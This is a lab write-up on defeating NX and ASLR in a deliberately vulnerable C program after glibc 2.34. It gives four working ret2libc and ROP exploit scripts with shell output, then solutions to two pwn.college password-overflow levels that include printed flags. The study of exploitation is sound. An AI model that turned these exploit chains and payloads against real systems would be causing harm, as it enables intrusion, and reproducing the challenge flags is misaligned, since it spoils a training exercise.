# Stage 4 — Binary Exploitation II: Defeating Mitigations (ret2libc) — Writeup

## 1. About this module

This module continues stage 03 (ret2win). There we used a buffer overflow to hijack the control flow and jump to a function that already exists in the program. Here the conditions are more realistic, and two protections stand in the way:

- **NX** prevents running code from the stack. The answer is **code reuse**: instead of injecting code, you chain together pieces of code that already exist and are marked executable. The function `system` and the string `"/bin/sh"` live in libc, which almost every program loads — if you redirect execution to `system` with `rdi` pointing to `"/bin/sh"`, you get a shell without injecting any code. This is **ret2libc**.
- **ASLR** places libc at a random address on every run, so you don't know where `system` is in advance. The answer is a **leak**: you use the overflow once to make the program reveal a real address from libc at runtime, compute the libc base from it, and then you know where every function in it is (the offsets inside libc are fixed).

### The change from the original idea

The starting assumption was that a `pop rdi; ret` gadget is **in the binary itself** (`rop.find_gadget(["pop rdi","ret"])`). That assumption was true until **glibc 2.34**: initialization code called `__libc_csu_init` was included in every dynamic binary, and with it these gadgets. Our binary is compiled against a modern glibc (2.39), in which this initialization code was **removed** — so we hit a dead end: without this gadget you can't even start the leak stage.

This writeup describes the dead end, the **dependency chain** that explains why *every* classic technique is blocked at the same point, and the **four escapes**, each of which supplies the missing primitive in a different way. This is exactly the purpose of the 2.34 hardening, and we found it.

**Environment and tools:**

```
gcc   : gcc (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0
glibc : ldd (Ubuntu GLIBC 2.39-0ubuntu8.9) 2.39   (after the glibc 2.34 CSU hardening)
ASLR  : on (default: /proc/sys/kernel/randomize_va_space = 2)
tools : gcc, readelf, objdump, ROPgadget, pwntools (ELF, flat, process, u64, asm)
```

> Note: the addresses shown in this writeup come from this environment. ASLR changes libc addresses on every run, so the values are only illustrative. All the exploits compute offsets **dynamically** (`ELF.search`), so they are portable across machines and glibc versions.

---

## 2. The source code, the offset, and the planned exploit

The code (`vuln.c`) — the same vulnerable function as in stage 03, without a `win` function:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable(void) {
    char buffer[64];
    puts("Enter data:");
    read(0, buffer, 256);
    puts("Done.");
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable();
    return 0;
}
```

The vulnerability: `read` reads up to **256** bytes into a **64**-byte buffer.

Build (dynamic, No-PIE, no canary, NX on):

```
gcc -g -O0 -fno-stack-protector -no-pie -o vuln vuln.c
```

The binary's protections (pwntools `checksec`):

```
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

**Partial RELRO + No PIE** matter: the GOT is still writable, and all the binary's addresses are fixed and known in advance.

### The offset — computed from the disassembly and verified at runtime

The disassembly of `vulnerable` shows the frame layout:

```
0000000000401176 <vulnerable>:
  40117a:  push   rbp
  40117b:  mov    rbp,rsp
  40117e:  sub    rsp,0x40                       ; local frame of 0x40 = 64 bytes
  401191:  lea    rax,[rbp-0x40]                 ; &buffer  (rbp-0x40)
  401195:  mov    edx,0x100                       ; count = 256
  40119a:  mov    rsi,rax
  40119d:  mov    edi,0x0                          ; fd = 0
  4011a2:  call   401070 <read@plt>               ; read(0, buffer, 256)  <-- the overflow
  4011b7:  leave
  4011b8:  ret                                     ; <-- the hijack happens here
```

The buffer sits at `rbp-0x40`, the return address at `rbp+8`. So the offset = `0x40 + 8 = 72`.

### The planned exploit: two-stage ret2libc

```
  +------------------------+
  | address of system      |  <- ret jumps here at the end
  +------------------------+
  | address of "/bin/sh"   |  <- loaded into rdi
  +------------------------+
  | gadget: pop rdi ; ret  |  <- loads the line above it into rdi
  +------------------------+
  | gadget: ret            |  <- 16-byte alignment (movaps)
  +------------------------+
  | padding up to offset 72|
  +------------------------+
```

The exploit relies on `pop rdi; ret`. This is where the dead end begins.

---

## 3. The Wall — no primitive in the binary

A search for an argument-control gadget comes back empty:

```
$ ROPgadget --binary vuln | grep -E ": pop (rdi|rsi|rdx)"
>>> NONE: no arg-control gadget in the binary
```

And the function that used to provide them is gone:

```
$ readelf -s vuln | grep -i csu
>>> NONE: __libc_csu_init removed (glibc >= 2.34)
```

**Why this matters:** before glibc 2.34, `__libc_csu_init` was included in every dynamic binary and contained a universal pair of gadgets:

```
pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret   ; loads 6 registers from the stack
mov rdx,r15 ; mov rsi,r14 ; mov edi,r13d ; call [r12+rbx*8]        ; the "bridge" to the argument registers
```

The "bridge" (`mov edi, r13d` + an indirect call) is what gave control over `rdi`. **Plain C code does not produce this bridge** — `rdi` is caller-saved, so no epilogue does `pop rdi`, and the compiler always loads arguments with a direct `mov` and not through the stack. (So even adding functions that take arguments does not produce a `pop rdi` — only `pop`s of callee-saved registers.)

The 2.34 hardening removed csu precisely to remove these gadgets (BZ #23323, "return-to-csu").

**But `pop rdi; ret` still exists — inside libc:**

```
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep -E ": pop rdi ; ret$"
0x000000000010c08d : pop rdi ; ret
```

It is always there, mapped executable. What hides it is ASLR — we don't know the libc base, so we don't know which address to jump to.

---

## 4. The Deadlock — why every path is blocked at the same point

```
   to get a shell
        │  need to call a function with a controlled argument  (system("/bin/sh"))
        ▼
   need to know where system is in libc
        │  because of ASLR
        ▼
   need a leak of a libc address
        │  to leak, need to call puts(puts@GOT)
        ▼
   need to pass a pointer in rdi
        │
        ▼
   need a gadget that controls rdi  ◄── every arrow ends here, and there is none in the binary
```

**Why every classic technique is blocked at the same point:**

- **ret2libc with a leak** — needs `pop rdi` twice: both to call `puts(puts@got)` for the leak stage, and to call `system("/bin/sh")`. Without `pop rdi` you can't even start the leak.
- **ret2csu** — relies on the `__libc_csu_init` gadget pair. They were removed in 2.34 — there is nowhere to return to.
- **ret2dlresolve** — you forge relocation structures to make the dynamic linker resolve and call a function *by name* (no leak!). But you still need (a) to write the structures to a known writable address — which requires reading/writing with controlled arguments = gadgets, and (b) at the final call, `rdi` to point to `"/bin/sh"` = `pop rdi`. Blocked at the same point, twice.
- **GOT overwrite → system** — you overwrite a GOT entry (for example `puts@got`) with the address of `system`, so the next `puts("...")` becomes `system("...")`. But (a) you need the address of `system` in libc = a leak, and (b) the call site passes a fixed string, not `"/bin/sh"` — to call `system("/bin/sh")` you still need control over `rdi`.

**The conclusion:** removing csu did not make exploitation "harder" — it removed the **single opening primitive** that every step depends on. Each escape from the wall is a different way to supply the missing primitive at a known address.

| Escape | File | Gadget source | Beats ASLR by |
|---|---|---|---|
| A | `exploit_A_gadget.py` | restored into the binary (inline asm) | two-stage leak (puts) |
| B | `exploit_B_static.py` | static libc inside the binary | No-PIE (fixed addresses) |
| C | `exploit_C_noaslr.py` | libc | disabling ASLR |
| D | `exploit_D_leak.py` | libc | leak from format-string |

---

## 5. Escape A — restoring the bootstrap gadget

We bring back the one missing instruction, as an explicit function written in inline asm (`vuln_gadget.c`):

```c
__asm__(                                   // emits the bytes 5f c3 into .text
    ".globl bootstrap_gadget\n"
    ".type  bootstrap_gadget, @function\n"
    "bootstrap_gadget:\n"
    "    pop %rdi\n"                        // 5f
    "    ret\n"                             // c3
);
```

This is not a normal C function (no prologue/epilogue, which is why it's asm and not a function body), and nobody calls it — for ROP it is enough that the bytes exist at a known address. After building:

```
$ ROPgadget --binary vuln_gadget | grep ": pop rdi ; ret$"
0x0000000000401176 : pop rdi ; ret
$ objdump -d vuln_gadget | grep -A2 "<bootstrap_gadget>:"
0000000000401176 <bootstrap_gadget>:
  401176:  pop    %rdi
  401177:  ret
```

### The exploit — stage 1: leak

```python
pop_rdi = elf.symbols["bootstrap_gadget"]          # the primitive we restored
chain = flat(
    b"A" * OFFSET,
    pop_rdi, elf.got["puts"],   # rdi = &puts@GOT
    elf.plt["puts"],            # puts(puts@GOT) -> print address libc of puts
    elf.symbols["main"],        # return to main for second input
)
```

The `ret` of `vulnerable` jumps to `pop_rdi` → `pop rdi` pops `puts@got` into `rdi` → the gadget's `ret` jumps to `puts@plt` → `puts(rdi)` prints the **contents** of the `puts@got` cell (6 bytes = the real address of `puts` in libc) → `puts` returns to `main` for a second round.

**Computing the libc base:**

```python
leaked = u64(p.recvline().strip().ljust(8, b"\x00"))   # 6 bytes padded to 8
libc.address = leaked - libc.symbols["puts"]           # base = real_address - offset
```

The offset of `puts` inside libc is fixed. Once we set `libc.address`, every `libc.symbols[...]` becomes an absolute runtime address.

### The exploit — stage 2: shell

```python
binsh = next(libc.search(b"/bin/sh\x00"))
chain2 = flat(
    b"A" * OFFSET,
    ret,                        # align stack to 16 bytes (movaps) — see 5.1
    pop_rdi, binsh,
    libc.symbols["system"],
)
```

Now that we know libc: `pop_rdi` puts `&"/bin/sh"` into `rdi`, and we call `system`. Run:

```
$ python3 ./exploit_A_gadget.py 
[+] Starting local process './vuln_gadget': pid 159031
[+] Leaked libc address: 0x79b21d287cc0
[*] Switching to interactive mode
Done.
$ echo hi
hi
```

*What this proves:* this single gadget was the only thing missing — once it is there, the leak beats ASLR.

### 5.1 The role of the alignment gadget — the movaps crash

The System V AMD64 ABI requires `rsp` to be 16-byte aligned at a call boundary. glibc uses SSE instructions like `movaps` (which need a 16-byte-aligned memory operand) inside `system`/`do_system`. If `rsp` is not aligned, `movaps` raises `#GP` → SIGSEGV.

When `ret` jumps to `system` it has already consumed 8 bytes from the stack. A single `ret` gadget consumes another 8 bytes → bringing us back to `rsp % 16 == 0`. That is the entire job of the "alignment gadget". With the `ret` → `movaps` passes → shell.

---

## 6. Escape B — static linking

`-static` pulls all of libc into the binary, and everything is No-PIE = fixed addresses, no leak:

```
$ file vuln_static
vuln_static: ELF 64-bit LSB executable, x86-64, statically linked
$ ROPgadget --binary vuln_static | wc -l
36420
$ ROPgadget --binary vuln_static | grep "pop rdi ; ret" | wc -l
0
```
(there are 36420 gadgets in the binary, but none of them is a clean `pop rdi ; ret`.)

### The goal: `execve("/bin/sh", 0, 0)` via syscall

We run a **raw syscall**. For execve we need to set up four registers and then run `syscall`:
 
| Register | Value | Role |
|---|---|---|
| `rax` | 59 | execve syscall number |
| `rdi` | address of `"/bin/sh"` | argument 1 |
| `rsi` | 0 | argument 2 (argv) |
| `rdx` | 0 | argument 3 (envp) |
 
Two obstacles: (1) there is no `"/bin/sh"` in the binary — we have to write it into memory; (2) we need gadgets to set up the registers.
 
### The addresses
# the four gadgets: from `ROPgadget --binary vuln_static`
```
$ ROPgadget --binary vuln_static
0x000000000042146b : pop rax ; ret
0x0000000000402138 : pop rdi ; pop rbp ; ret
0x000000000046847c : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000404ec2 : pop rsi ; pop rbp ; ret
```

Now we locate the address of the read call
```
$ objdump -d vuln_static | grep -A 20 'vulnerable' 

0000000000401905 <vulnerable>:
  401905:       f3 0f 1e fa             endbr64
  401909:       55                      push   %rbp
  40190a:       48 89 e5                mov    %rsp,%rbp
  40190d:       48 83 ec 40             sub    $0x40,%rsp
  401911:       48 8d 05 f8 d6 07 00    lea    0x7d6f8(%rip),%rax        # 47f010 <__rseq_flags+0xc>
  401918:       48 89 c7                mov    %rax,%rdi
  40191b:       e8 b0 34 00 00          call   404dd0 <_IO_puts>
  401920:       48 8d 45 c0             lea    -0x40(%rbp),%rax   --> here the read call begins, setting up the registers
  401924:       ba 00 01 00 00          mov    $0x100,%edx
  401929:       48 89 c6                mov    %rax,%rsi
  40192c:       bf 00 00 00 00          mov    $0x0,%edi
  401931:       e8 fa 7c 01 00          call   419630 <__libc_read>
  401936:       48 8d 05 df d6 07 00    lea    0x7d6df(%rip),%rax        # 47f01c <__rseq_flags+0x18>
  40193d:       48 89 c7                mov    %rax,%rdi
  401940:       e8 8b 34 00 00          call   404dd0 <_IO_puts>
  401945:       90                      nop
  401946:       c9                      leave
  401947:       c3                      ret
```

```python
# four gadgets from `ROPgadget --binary vuln_static`:
pop_rdi_rbp = 0x402138   # pop rdi ; pop rbp ; ret        -> sets up rdi
pop_rsi_rbp = 0x404ec2   # pop rsi ; pop rbp ; ret        -> sets up rsi
pop_rdx     = 0x46847c   # pop rdx ; xor eax,eax ; pop rbx/r12/r13/rbp ; ret   -> sets up rdx
pop_rax     = 0x42146b   # pop rax ; ret                  -> sets up rax
 
# syscall;ret does not show up in ROPgadget, so we search its bytes (0f 05 c3) directly:
#   next(elf.search(b"\x0f\x05\xc3", executable=True))  ->  0x40ba46
syscall_ret = 0x40ba46   # syscall ; ret                  -> runs the syscall
 
# the read call-site inside vulnerable: from `objdump -d vuln_static`
read_lea    = 0x401920   # the instruction: lea rax,[rbp-0x40] ; ... ; call read
 
# a free staging area in .bss: from pwntools' elf.bss()
B = (elf.bss(0) + 0x600) & ~0xf
```


### The exploit — two parts
 
**Part 1: write the blob to `B`, using the program's own `read`.**
 
The key: the `read` inside `vulnerable` writes to `rbp-0x40` (see `read_lea` above). The address depends on `rbp` — so if we control `rbp`, we control where it writes.
 
```python
# overflow: saved rbp = B+0x40 , return address = read_lea
p.send(b"A" * 64 + p64(B + 0x40) + p64(read_lea))
```
 
When `vulnerable` returns, `rbp` is loaded with `B+0x40` and we jump to `read_lea`. There `rbp-0x40 = B`, so the program runs `read(0, B, 256)` — **and writes our next input to `B`**. No write gadget needed: the `read` arguments are already in place, we only controlled `rbp`.
 
**Part 2: the blob, and the pivot.**
 
```python
chain = flat(
    pop_rdi_rbp, B, 0,              # rdi = B (address of "/bin/sh") ; rbp = junk
    pop_rsi_rbp, 0, 0,             # rsi = 0 ; rbp = junk
    pop_rdx,     0, 0, 0, 0, 0,    # rdx = 0 ; + 4 junk
    pop_rax,     59,              # rax = 59 (execve)
    syscall_ret,                 # syscall -> execve("/bin/sh", 0, 0)
)
blob = b"/bin/sh\x00".ljust(0x48, b"C") + chain
p.send(blob)
```
 
The blob is written to `B`, and this is its layout in memory:
 
```
B+0x00:  "/bin/sh\0"        <- the address we put in rdi
B+0x08:  padding
B+0x48:  chain (the ROP chain)
```
 
Now `vulnerable` reaches the second `leave ; ret`. `leave` is `mov rsp,rbp ; pop rbp`, and `rbp` is still `B+0x40` — so **`rsp` jumps into `B`**, and the `ret` starts running the chain from `B+0x48`. This is the **pivot**: we moved the stack into the data we wrote. From there the chain sets up the four registers and runs `syscall` → shell.


### The result
 
```
$ python3 exploit_B_static.py 
[+] Starting local process './vuln_static': pid 162002
[*] Switching to interactive mode
$ echo hi
hi
```

*What this proves:* static linking provides the gadgets at a fixed address — needs zero leak.

---

## 7. Escape C — disabling ASLR

The baseline binary (with no gadget of its own), but ASLR is off → libc at a fixed address. We use the `pop rdi` gadget and `system` from libc itself, at their fixed addresses:

```python
p = process("./vuln", aslr=False)       # ADDR_NO_RANDOMIZE -> libc fixed
libc    = p.libc
pop_rdi = next(libc.search(asm("pop rdi; ret"), executable=True))  # at 0x10c08d in libc
binsh   = next(libc.search(b"/bin/sh\x00"))
system  = libc.symbols["system"]
p.send(flat(
    b"A" * OFFSET,
    pop_rdi + 1,            # the c3 byte = a lone ret for alignment
    pop_rdi, binsh,
    system,
))
```

No leak and no gadget in the binary — the address of `pop rdi` inside libc is simply known, because ASLR is off:

```
$ python3 exploit_C_noaslr.py 
[+] Starting local process './vuln': pid 162081
[!] ASLR is disabled!
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] Switching to interactive mode
Done.
$ echo hi
hi
```

*What this proves:* the gadget was always in libc; ASLR was the only thing hiding it.

### 7.1 Why a leak and not a guess

Escape C works only because ASLR is off. If we tried to guess a fixed address for `system` **while ASLR is on**, libc lands at a different address every run, so a fixed address does not match — the chance to guess is `1/2^entropy` (about 28 bits on x86-64 in practice). **Guessing works only when ASLR is off (Escape C); under ASLR you must leak (Escape A/D).** That is exactly the difference: Escape A/D read the real base on every run.

---

## 8. Escape D — a real leak via format-string

The same gadget-less binary, ASLR on — the leak comes from a **real bug**: `vuln_leak.c` adds an input line with a format-string vulnerability:

```c
char name[64];
puts("Enter your name:");
read(0, name, 63);
printf(name);        // the bug: the user controls the format string (should be printf("%s", name))
```

### Why this leaks

`printf` parses the format. If the user sends `%p`, printf prints its next argument — but there is **no** real argument, so it reads a "junk" value from a register or from the stack. With `%N$p` you pick the N-th argument. Among these values there is a **real pointer into libc** (a value left in a register from an earlier call).

### Finding the position

We scan `%1$p`..`%40$p`, looking for a position that returns a libc address **stably** on every run. Both `%3$p` and `%5$p` returned libc addresses — but only one of them is constant. We run several times and compare the offset (address minus libc base) on each run:
 
```
run |   %3$p offset  |   %5$p offset
----+----------------+----------------
  1 |     0x11bd31   |     0x2c6380
  2 |     0x11bd31   |     0x3e7380
  3 |     0x11bd31   |     0x3bb380
  4 |     0x11bd31   |     0x394380
  5 |     0x11bd31   |     0x268380
```
 
`%3$p` always gives `0x11bd31` — **constant**, so we can rely on it. `%5$p` changes every run — useless. So we pick `%3$p` and offset `0x11bd31` (a libc-version-dependent value, found by this probing).


### The exploit

```python
LEAK_POS = 3          # the position found by probing
LEAK_OFF = 0x11bd31   # its fixed offset inside libc

# step 1 — the leak: print %3$p, wrapped in markers for safe parsing
p.sendline(b"LEAK%3$pEND")
p.recvuntil(b"LEAK")
leaked = int(p.recvuntil(b"END", drop=True), 16)
libc.address = leaked - LEAK_OFF            # libc base

# step 2 — ret2libc using libc's own gadget
pop_rdi = next(libc.search(asm("pop rdi; ret"), executable=True))
binsh   = next(libc.search(b"/bin/sh\x00"))
p.recvuntil(b"Enter data:\n")
p.send(flat(b"A"*OFFSET, pop_rdi+1, pop_rdi, binsh, libc.symbols["system"]))
```

The leak from the bug reveals the libc base → from there it's a normal ret2libc with `pop rdi` and `system` from libc, **with no gadget at all in the binary**.

### The result

```
$ python3 exploit_D_leak.py 
[+] Starting local process './vuln_leak': pid 163140
[+] leaked libc ptr = 0x74e3cc31bd31
[+] libc base       = 0x74e3cc200000
[*] Switching to interactive mode
Done.
$ echo hi
hi
```

*What this proves:* one leak — from a real bug — opens the entire gadget pool of libc, and beats ASLR with no gadget in the binary at all. This is the realistic version of Escape D: in the real world the leak comes from a bug (format-string, over-read), not from an explicit `printf`.

---

## 9. system vs one_gadget

`system("/bin/sh")` needs two things: `rip`→`system` **and also** `rdi`→`"/bin/sh"` (that is, `pop rdi`). **one_gadget** is a single address inside libc where glibc has already set up `execve("/bin/sh", …)` by itself — jumping there gives a shell **without controlling the arguments**. The price: every one_gadget requires a **constraint** — a condition on a register/memory (for example `rdx == NULL`) that must hold at the moment of the jump.

| | `system("/bin/sh")` | `one_gadget` |
|---|---|---|
| Control over `rdi`? | yes → needs `pop rdi` | no |
| leak? | yes | yes |
| Extra limitation | stack alignment (`movaps`) | must satisfy the **constraint** |

**Relation to the deadlock:** one_gadget is the only one that does not require `pop rdi`, so it is the most tempting for a gadget-less binary. But if the constraint does not hold by itself, you need to control a register to zero it — and that brings you back *exactly* to the gadget problem. It's a trade-off, not a way around the wall.

---

## 10. Conclusion

One wall: **without an argument-control gadget at a known address, there is no way to start.** The four escapes are four ways to provide exactly that:

| Escape | Gadget source | Beats ASLR by |
|---|---|---|
| A | restored into the binary (inline asm) | leak (puts) |
| B | static libc inside the binary | No-PIE (fixed addresses) |
| C | libc | disabling ASLR |
| D | libc | leak from format-string |

This is exactly what the glibc 2.34 CSU hardening was meant to do: not to block exploitation completely, but to **remove the free starting point** and force the attacker to obtain a real leak or some other easing condition. The original exercise silently assumed pre-2.34 behavior; this binary lives after the change, so the "classic" path as written no longer starts — and that is the finding.

In a **large** program this dead end barely exists: the sheer volume of code (many epilogues + unintended gadgets) almost always provides a `pop rdi`, and anyway one leak is enough to use libc's own gadgets. The dead end is a phenomenon of a **small, clean** program.

---

## 11. Exercise 5 — pwn.college, Program Security module (Babymem)

**Dojo:** Program Security → Memory Errors module (the binaries are named `babymem-level-*`)
**Link:** https://pwn.college/program-security/program-security/
**Levels solved:** `login-leakage-easy`, `login-leakage-hard`

Both levels here share one core technique and differ only in **how you find the offset to the password** — which is why they make a good pair: the same weakness, two different investigation paths.

### What the program does

In both levels: the program draws a random password (8 bytes from `/dev/urandom`), stores it on the stack, reads user input into a buffer on the stack, and compares the two with `strcmp`. A match → it prints the flag. The buffer is short (69 bytes) but the program allows an arbitrary input length — hence the overflow up to the password area.

### The core technique — null vs null

Instead of guessing or leaking the random password, we exploit the fact that `strcmp` stops at the null terminator: we overwrite the **first byte** of the password with `\x00`, and also start our input with `\x00`. The result is `strcmp("", "")` → 0, the check passes — without knowing the password at all.

---

### The path to the solution (the easy level)

The solution was not immediate. We went through one wrong hypothesis and two obstacles, and each taught something — so the full process is documented here, not just the result.

**1. A wrong hypothesis: overwriting a 2-byte pointer.** On the first attempt, a "blind" overflow with many `A` bytes returned the program's own warning:

```
WARNING: You sent in too much data, and overwrote more than two bytes of the address.
         You can solve this challenge by only overwriting two bytes!
Checking Password...
Password check failed! Exiting!
```
 
The warning ("overwrote more than two bytes of the address") led to the hypothesis that the solution is overwriting a 2-byte **pointer**. Disassembling `challenge` in gdb disproved it. The relevant parts of the output (the full dump is ~150 lines; here are the decisive regions, verbatim):
 
Our input is read into `buffer` (at `rbp-0x830`, offset 0), and the random password is read into the **same** buffer at offset `0x81f`:
 
```
; read the password (8 bytes from /dev/urandom) into buffer+0x81f
   <+105>:  lea    -0x830(%rbp),%rax
   <+112>:  lea    0x81f(%rax),%rcx          ; rcx = buffer + 0x81f
   <+122>:  mov    $0x8,%edx                 ; count = 8
   <+127>:  mov    %rcx,%rsi                 ; dst = buffer+0x81f
   <+132>:  call   0x1190 <read@plt>         ; read(urandom, buffer+0x81f, 8)
...
; read our input into buffer (offset 0)
   <+728>:  mov    -0x838(%rbp),%rdx         ; count = the size we asked for (from scanf)
   <+735>:  lea    -0x830(%rbp),%rax
   <+742>:  mov    %rax,%rsi                 ; dst = buffer
   <+745>:  mov    $0x0,%edi                 ; fd = 0 (stdin)
   <+750>:  call   0x1190 <read@plt>         ; read(0, buffer, count) -> our input at buffer+0
```
 
And the comparison itself — `strcmp` between the two offsets of the same buffer:
 
```
   <+1053>: lea    -0x830(%rbp),%rax
   <+1060>: lea    0x81f(%rax),%rdx          ; rdx = buffer + 0x81f   (the password)
   <+1067>: lea    -0x830(%rbp),%rax         ; rax = buffer           (our input)
   <+1074>: mov    %rdx,%rsi                 ; arg 2 = buffer+0x81f
   <+1077>: mov    %rax,%rdi                 ; arg 1 = buffer
   <+1080>: call   0x11a0 <strcmp@plt>       ; strcmp(buffer, buffer+0x81f)
   <+1085>: test   %eax,%eax
   <+1087>: je     0x222f <challenge+1111>   ; equal -> win
```
 
The discovery: **there is no separate pointer to the password.** The two `read` calls write to the same `rbp-0x830` — the input at offset 0, the password at offset `0x81f` — and `strcmp` compares these two offsets inside the same array. The `0x81f` offset in the code is exactly the `2079` the program prints (step 2).
 
And what about the "2 bytes of the address" in the warning? They refer to the **return address**, not the password. The code compares the end of our input against the saved return address (`rp_`, computed earlier as `bp_+8`):
 
```
   <+949>:  mov    -0x8(%rbp),%eax           ; eax = number of bytes we sent (read's return value)
   <+955>:  lea    -0x830(%rbp),%rax
   <+962>:  add    %rax,%rdx                 ; rdx = buffer + nbytes  (end of our input)
   <+965>:  mov    0x2fec(%rip),%rax         # rp_ = saved return address (bp_+8)
   <+972>:  add    $0x2,%rax                 ; rax = rp_ + 2
   <+976>:  cmp    %rax,%rdx
   <+979>:  jbe    0x21e9 <challenge+1041>   ; if end <= rp_+2 skip the warning, otherwise warn
```
 
In other words, the warning is a hint toward a **different** path — a partial (2-byte) overwrite of the return address. Our solution ignores it entirely: it touches neither the return address nor any pointer, but overwrites the **contents** of the password (one `\x00` byte) and neutralizes the `strcmp`.


**2. The program prints the offset for us.** In easy there is no need to compute anything; the program states explicitly where the password is and how far it is from the input (full excerpt):

```
The input buffer begins at 0x7ffc16958200, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 69 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

This challenge is a password checker that will check your input against a randomly generated password.
The password is stored at 0x7ffc16958a1f, 2079 bytes after the start of your input buffer.
```

The distance is given verbatim — **2079 bytes**. Checking across several runs showed the number is constant: ASLR moves the whole stack at once, so the absolute addresses change but the relative distance does not. So there is no need to leak any address.


**3. A breakpoint on strcmp — and the linker obstacle.** To see exactly what is compared, we set a breakpoint and inspected registers. `b strcmp` stopped first on calls from the dynamic linker, not on the password check:

```
Breakpoint 4.2, strcmp () at ../sysdeps/x86_64/strcmp.S:111
(gdb) x/s $rsi
0x7c48d83ca9d1: "ld-linux-x86-64.so.2"
(gdb) x/s $rdi
0x5f7b9f351318: "/lib64/ld-linux-x86-64.so.2"
```

These are library-loading strings. The fix: a precise breakpoint on the call inside `challenge` (`b *challenge+<offset>`), which caught the real comparison.

**4. The random password + the pipe problem.** We tried to read the password bytes and send them back — it failed, because the password is regenerated every run from `/dev/urandom`, and the piped input is fixed in advance before the program even drew it. In addition, the `read` stopped early:

```
Payload size: You have chosen to send 2087 bytes of input!
You sent 2079 bytes!          <- exactly the last 8 bytes were missing
```

The cause: the `scanf("%d")` that reads the payload size uses stdio buffering and swallows some of the binary bytes after it, so the `read` gets only the leftovers.

**5. The fix — null vs null, via a file.** Both problems were solved together: (a) instead of knowing the password — we overwrite its first byte with `\x00` and start the input with `\x00`, so `strcmp("","")==0` regardless of the value; (b) instead of a pipe — we write the payload to a file and stream it, so all the bytes are available at once.

```
$ { echo 2080; printf '\x00'; printf 'A%.0s' $(seq 1 2078); printf '\x00'; } > /tmp/payload;
$ ./login-leakage-easy < /tmp/payload

The program's memory status:
- the input buffer starts at 0x7ffdd8c7b850
- the password buffer starts at 0x7ffdd8c7c06f

Checking Password...
Password check passed!
You win! Here is your flag:
pwn.college{Q76IOzCuBY5s_SYq7NvXZiF_saV.0FM4cDOxwiN0YTMyIzW}


Goodbye!
```

Payload layout: size `2080` (answers scanf), a `\x00` byte (the input becomes an empty string), 2078 padding bytes, a `\x00` byte that lands on offset 2079 and overwrites the start of the password.

---

### The hard level — same technique, an offset you find yourself

In hard the binary is built differently and is more hardened:

```
$ checksec /challenge/login-leakage-hard
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

(the binary is also `setuid` — so it must be run directly to get the permissions to read `/flag`.)

The practical difference: **the program does not print the offset.** You have to find it yourself in gdb.

The correct flow: `start` (stop at the beginning of main) → `disas challenge` (locate `call strcmp@plt`) → a precise breakpoint on the call → inspect the arguments:

```
Breakpoint 11, 0x00006311abcd4881 in challenge ()
(gdb) x/s $rsi
0x7ffce39c0e2d: "zT)\342\374\374\260;c"
(gdb) x/s $rdi
0x7ffce39c0a70: "aaa"
(gdb) x/8xb $rsi
0x7ffce39c0e2d: 0x7a    0x54    0x29    0xe2    0xfc    0xfc    0xb0    0x3b
```

`$rdi` is our input (`"aaa"`), `$rsi` is the run's random password. From the address difference we computed the offset:

```
0xe2d - 0xa70 = 0x3bd = 957
```

**957 bytes** (versus 2079 in easy). From there, the exact same trick:

```
$ { printf '963\n'; printf '\x00'; printf 'A%.0s' $(seq 1 956); printf '\x00'; } > /tmp/payload
$ /challenge/login-leakage-hard < /tmp/payload

Payload size: Send your payload (up to 963 bytes)!
Password check passed!
You win! Here is your flag:
pwn.college{g_UX5F4F8wNQUEaYBUkU9rCIF65.0VM4cDOxwiN0YTMyIzW}


Goodbye!
```

Payload layout: a `\x00` byte, 956 padding bytes, a `\x00` byte that lands on offset 957.

---

### Summary — the technique in each level

| Level | Core technique | How the offset was found | Flag |
|---|---|---|---|
| easy | null vs null (bypassing `strcmp`) | **given in the program's output** (2079) | `pwn.college{Q76IOzCuBY5s_SYq7NvXZiF_saV.0FM4cDOxwiN0YTMyIzW}` |
| hard | null vs null (bypassing `strcmp`) | **found in gdb** — breakpoint on the `call` and inspecting `$rsi`/`$rdi` (957) | `pwn.college{g_UX5F4F8wNQUEaYBUkU9rCIF65.0VM4cDOxwiN0YTMyIzW}` |

*What this proves:* when a secret is stored in the same buffer that unbounded input flows into, you don't need to leak or guess it — it's enough to neutralize the comparison. `strcmp` stops at the null, so two `\x00` bytes (one in the input, one on the start of the secret) turn both sides into an empty string and the check passes. The difference between the levels is not in the weakness but in **how much investigation work** it takes to find the offset: in easy it's free in the output, in hard you obtain it by debugging.

---

## Appendix — files and commands

```
vuln.c / vuln                baseline: vulnerable, no gadget (Escape C, source for D)
vuln_gadget.c / vuln_gadget  Escape A: + bootstrap_gadget (pop rdi;ret)
vuln_static                  Escape B: vuln.c with -static
vuln_leak.c / vuln_leak      Escape D: + an info-leak line
exploit_A_gadget.py          two-stage ret2libc (leak) under ASLR
exploit_B_static.py          bss pivot + execve, no leak
exploit_C_noaslr.py          libc gadget at a fixed address (ASLR off)
exploit_D_leak.py            format-string leak -> ret2libc under ASLR
verify.sh                    rebuilds and verifies that the wall holds and that all 4 escapes give a shell
Makefile                     rebuilds all the binaries
```

```bash
make                          # builds vuln, vuln_gadget, vuln_static, vuln_leak
./verify.sh                   # rebuilds and verifies everything (6/6)
```

*Note on reproducibility:* the offsets inside libc (for example `pop rdi` at `0x10c08d`, `_IO_2_1_stdout_`) are version-dependent. All the exploits compute them dynamically (`ELF.search`), so they are portable across glibc versions.